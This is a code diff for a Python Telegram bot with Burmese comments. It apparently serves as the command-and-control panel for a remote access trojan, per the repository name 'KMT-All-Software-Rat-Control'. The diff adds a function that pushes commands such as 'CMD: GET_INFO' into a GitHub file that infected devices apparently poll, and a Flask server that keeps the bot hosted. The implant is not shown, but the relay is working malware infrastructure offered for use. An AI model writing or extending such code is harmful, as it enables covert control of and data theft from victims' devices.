@@ -1,14 +1,43 @@
 import os
+import threading
 import telebot
 import requests
+import base64
+from flask import Flask
 
+# 1. Flask App တည်ဆောက်ခြင်း (Render အတွက် Port 10000 လက်ခံရန်)
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "Bot is running live on Render!"
+
+# 2. Telegram Bot သတ်မှတ်ချက်များ
 TOKEN = os.environ.get('BOT_TOKEN')
-bot = telebot.TeleBot(TOKEN)
-
-# GitHub Repository အချက်အလက်များ
 GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
 REPO_OWNER = "qqq1234ttttt"
 REPO_NAME = "KMT-All-Software-Rat-Control"
+FILE_PATH = "command.txt"
+
+bot = telebot.TeleBot(TOKEN)
+
+def update_github(command):
+    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
+    headers = {
+        "Authorization": f"Bearer {GITHUB_TOKEN}", 
+        "Accept": "application/vnd.github+json"
+    }
+    response = requests.get(url, headers=headers)
+    if response.status_code == 200:
+        sha = response.json()['sha']
+        content_encoded = base64.b64encode(command.encode('ascii')).decode('ascii')
+        
+        data = {
+            "message": "Update command from Telegram Bot",
+            "content": content_encoded,
+            "sha": sha
+        }
+        requests.put(url, headers=headers, json=data)
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -20,20 +49,19 @@ def send_welcome(message):
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     if call.data == "get_device":
-        # GitHub Actions သို့ Signal ပို့ရန် (Repository Dispatch)
-        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/dispatches"
-        headers = {
-            "Authorization": f"Bearer {GITHUB_TOKEN}",
-            "Accept": "application/vnd.github+json"
-        }
-        data = {"event_type": "update_command", "client_payload": {"cmd": "CMD: GET_INFO"}}
-        
-        res = requests.post(url, headers=headers, json=data)
-        if res.status_code == 204:
-            bot.answer_callback_query(call.id, "Command Sent!")
-            bot.send_message(call.message.chat.id, "📱 Device Info တောင်းဆိုသည့် အမိန့်ကို GitHub သို့ ပို့ပြီးပါပြီ။")
-        else:
-            bot.answer_callback_query(call.id, "Failed to send command.")
+        update_github("CMD: GET_INFO")
+        bot.answer_callback_query(call.id, "Command Sent!")
+        bot.send_message(call.message.chat.id, "📱 Device Info တောင်းဆိုသည့် အမိန့်ကို GitHub သို့ ပို့ပြီးပါပြီ။")
+
+# 3. Telegram Bot ကို Background Thread ဖြင့် Run ခြင်း
+def run_bot():
+    bot.infinity_polling()
 
 if __name__ == "__main__":
-    bot.infinity_polling()
+    # Bot ကို သီးသန့် Thread နဲ့ စတင်ခြင်း
+    t = threading.Thread(target=run_bot)
+    t.start()
+    
+    # Flask Server ကို Port 10000 ဖြင့် စတင်ခြင်း (Render အတွက်)
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port)
